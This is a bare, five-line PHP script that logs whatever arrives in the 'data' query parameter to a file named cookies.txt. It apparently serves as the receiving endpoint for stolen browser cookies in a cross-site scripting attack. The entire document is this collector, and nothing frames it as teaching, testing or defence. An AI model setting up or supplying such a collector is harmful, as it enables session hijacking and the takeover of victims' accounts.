<?php 
if (isset($_GET['data'])) {
    file_put_contents("cookies.txt", $_GET['data'] . PHP_EOL, FILE_APPEND); 
}
?>
